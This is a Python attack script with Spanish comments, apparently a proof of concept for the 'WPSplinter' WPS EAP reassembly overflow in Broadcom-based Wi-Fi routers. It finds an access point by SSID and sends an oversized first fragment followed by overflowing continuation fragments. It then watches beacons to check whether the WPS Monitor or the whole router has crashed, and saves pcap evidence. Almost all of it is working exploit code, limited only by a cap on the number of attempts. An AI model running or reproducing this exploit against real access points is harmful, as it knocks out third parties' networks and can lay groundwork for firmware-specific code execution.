#!/usr/bin/env python3
# Copyright 2026 Ignacio Benito Herrero
# Licensed under the Apache License, Version 2.0.
"""Provocación acotada WPSplinter: desborda el reensamblado EAP y comprueba la salud del AP.

El fingerprinter oficial (third_party/broadcom-wps) se detiene en el primer
fragmento y nunca lo continúa: por eso es inofensivo. Este probe da el paso
siguiente, genérico para cualquier AP `LIKELY_VULNERABLE` de la familia
Broadcom: tras el primer fragmento (con longitud total declarada enorme)
envía N fragmentos de continuación que el reensamblador vulnerable copia
más allá de su búfer (primitiva "arbitrary write by controlling
total_received" de las diapositivas de Hexacon 2026). El resultado esperado
en un AP sin calibrar es DoS del WPS Monitor o del AP (reinicio), no RCE:
la ejecución arbitraria exige offsets por firmware.

Riesgo asumido: cada golpe puede tumbar el monitor WPS o el router. El
probe siempre termina solo (golpes y esperas acotados) y clasifica la
salud del AP tras cada golpe observando balizas y anuncios WPS.
"""

import argparse
import importlib.util
import json
import os
import sys
import time
from datetime import datetime, timezone
from pathlib import Path


def cargar_vendor():
    ruta = (Path(__file__).resolve().parent / "third_party" / "broadcom-wps"
            / "broadcom_fingerprint.py")
    if not ruta.is_file():
        raise SystemExit(f"falta {ruta}")
    espec = importlib.util.spec_from_file_location("broadcom_fingerprint", ruta)
    if espec is None or espec.loader is None:
        raise SystemExit(f"no se pudo cargar {ruta}")
    modulo = importlib.util.module_from_spec(espec)
    # los @dataclass del módulo resuelven tipos vía sys.modules: hay que
    # registrarlo ANTES de ejecutarlo o revienta con AttributeError en 3.13
    sys.modules["broadcom_fingerprint"] = modulo
    espec.loader.exec_module(modulo)
    return modulo


def disparar_golpes(v, backend, station, identifier, fragmentos):
    """Primer fragmento con total=0xFFFF + continuación hasta agotar fragmentos.

    Devuelve cuántos fragmentos de continuación aceptó el reensamblador antes
    de callar, responder o perder la sesión.
    """
    primer = (0xFFFF).to_bytes(2, "big") + b"\x04" + b"A" * 60
    backend._send_eapol(station, v._wps_response(
        identifier, v.LENGTH_FIELD | v.MORE_FRAGMENTS, primer))
    try:
        backend._wait_eap(station, 3.0, accept_repeated=True)
    except Exception:  # noqa: BLE001 - el silencio aquí también es señal
        return 0
    aceptados = 0
    for i in range(fragmentos):
        # +0x9 debe empezar con opcode WSC válido (0x04..0x0F): se respeta.
        cuerpo = b"\x04" + bytes((i & 0xFF,)) + b"B" * 1400
        try:
            backend._send_eapol(station, v._wps_response(
                identifier, v.MORE_FRAGMENTS, cuerpo))
        except Exception:  # noqa: BLE001
            break
        aceptados += 1
        try:
            backend._wait_eap(station, 1.0, accept_repeated=True)
        except Exception:  # noqa: BLE001 - silencio: seguimos golpeando
            pass
    return aceptados


def comprobar_salud(v, discovery, target, espera):
    """HEALTHY (balizas+WPS), WPS_SILENT (balizas sin WPS), SIN_BALIZAS."""
    time.sleep(espera)
    try:
        v.set_channel(discovery.interface, target.channel)
        revalidado = discovery.revalidate(target)
    except Exception:  # noqa: BLE001
        return "SIN_BALIZAS"
    return "HEALTHY" if revalidado.wps_advertised else "WPS_SILENT"


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Provocación acotada WPSplinter (riesgo de DoS asumido)")
    parser.add_argument("--interfaz", "--interface", required=True)
    parser.add_argument("--ssid", required=True)
    parser.add_argument("--golpes", type=int, default=2, help="1..5 (por defecto 2)")
    parser.add_argument("--fragmentos", type=int, default=12,
                        help="fragmentos de continuación por golpe (2..48)")
    parser.add_argument("--espera", type=int, default=25,
                        help="segundos de espera antes de comprobar salud (5..120)")
    parser.add_argument("--salida", help="directorio de evidencias")
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args(argv)

    if not 1 <= args.golpes <= 5:
        parser.error("golpes fuera de 1..5")
    if not 2 <= args.fragmentos <= 48:
        parser.error("fragmentos fuera de 2..48")
    if not 5 <= args.espera <= 120:
        parser.error("espera fuera de 5..120")
    if args.dry_run:
        print(f"Plan: {args.golpes} golpes × {args.fragmentos} fragmentos de "
              f"continuación contra '{args.ssid}' por {args.interfaz}; salud "
              f"comprobada tras {args.espera}s por golpe. RIESGO: puede tumbar "
              "el WPS Monitor o reiniciar el AP.")
        return 0
    if os.geteuid() != 0:
        parser.error("requiere sudo")

    v = cargar_vendor()  # importa scapy; falla con ModuleNotFoundError si falta
    try:
        v.inspect_monitor_interface(args.interfaz)
    except Exception as error:  # noqa: BLE001
        parser.error(f"interfaz {args.interfaz}: {error}")

    inicio = Path.home()
    usuario = os.environ.get("SUDO_USER")
    if usuario and os.geteuid() == 0:
        import pwd
        try:
            inicio = Path(pwd.getpwnam(usuario).pw_dir)
        except KeyError:
            pass
    base = Path(args.salida).expanduser() if args.salida else inicio / "capturas_wifi" / "wpsplinter"
    sello = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S.%fZ")
    evidencias = base / f"wpsplinter-probe-{sello}"
    evidencias.mkdir(parents=True, exist_ok=True, mode=0o700)
    resumen_ruta = evidencias / "probe.json"
    writer = v.PcapWriter(str(evidencias / "traffic.pcap"), linktype=127, sync=True)

    resumen = {"ssid": args.ssid, "interfaz": args.interfaz, "golpes": [],
               "riesgo": "DoS asumido por el operador", "veredicto": None}

    def cerrar(codigo):
        writer.close()
        resumen_ruta.write_text(json.dumps(resumen, indent=2, ensure_ascii=False),
                                encoding="utf-8")
        if usuario and os.geteuid() == 0:
            import subprocess
            subprocess.run(["chown", "-R", usuario, str(base)], capture_output=True,
                           timeout=15, check=False)
        print(f"Evidencias: {evidencias}")
        return codigo

    try:
        discovery = v.LiveDiscovery(args.interfaz, writer)
        objetivo = None
        for barrido in range(1, 4):
            print(f"Buscando '{args.ssid}' (barrido {barrido})...", file=sys.stderr)
            observados = discovery.scan_sweep(args.ssid)
            if observados:
                objetivo = v.select_target(observados, args.ssid)
                break
        if objetivo is None:
            resumen["veredicto"] = "ERROR: SSID no encontrado"
            print(resumen["veredicto"], file=sys.stderr)
            return cerrar(3)
        objetivo = discovery.revalidate(objetivo)
        print(f"Objetivo {objetivo.bssid} canal {objetivo.channel} "
              f"({objetivo.vendor} {objetivo.model})", file=sys.stderr)
        peor = "HEALTHY"
        for numero in range(1, args.golpes + 1):
            backend = v.ScapyFingerprintBackend(args.interfaz, objetivo, writer)
            with backend:
                station = v.random_station()
                try:
                    identificador = backend._start_wps(station)
                    aceptados = disparar_golpes(v, backend, station, identificador,
                                                args.fragmentos)
                except Exception as error:  # noqa: BLE001
                    aceptados = -1
                    print(f"golpe {numero}: sesión WPS perdida ({error})",
                          file=sys.stderr)
                try:
                    backend._deauthenticate(station)
                except Exception:  # noqa: BLE001
                    pass
            estado = comprobar_salud(v, discovery, objetivo, args.espera)
            resumen["golpes"].append({"golpe": numero,
                                      "fragmentos_enviados": aceptados,
                                      "estado_ap": estado})
            print(f"golpe {numero}/{args.golpes}: {aceptados} fragmentos "
                  f"aceptados · AP: {estado}")
            orden = {"HEALTHY": 0, "WPS_SILENT": 1, "SIN_BALIZAS": 2}
            if orden[estado] > orden[peor]:
                peor = estado
            if estado == "SIN_BALIZAS":
                break
        resumen["veredicto"] = peor
        print(f"\nVeredicto: {peor}")
        if peor == "HEALTHY":
            print("El AP sobrevivió todos los golpes: o el reensamblador no es "
                  "el vulnerable, o el desbordamiento no alcanza a tumbarlo con "
                  "esta secuencia genérica (la RCE necesita calibración por "
                  "firmware).")
        elif peor == "WPS_SILENT":
            print("Balizas OK pero el AP dejó de anunciar WPS: el WPS Monitor "
                  "cayó (DoS del parser). Suele volver al reiniciar el router o "
                  "al recargar el firmware.")
        else:
            print("El AP dejó de emitir balizas: reinicio o caída completa. "
                  "Espera 1-2 min a que arranque antes de volver a probar.")
        return cerrar(0 if peor == "HEALTHY" else (1 if peor == "WPS_SILENT" else 2))
    except KeyboardInterrupt:
        resumen["veredicto"] = "INTERRUMPIDO"
        return cerrar(130)
    except Exception as error:  # noqa: BLE001
        resumen["veredicto"] = f"ERROR: {type(error).__name__}: {error}"
        print(resumen["veredicto"], file=sys.stderr)
        return cerrar(3)


if __name__ == "__main__":
    raise SystemExit(main())
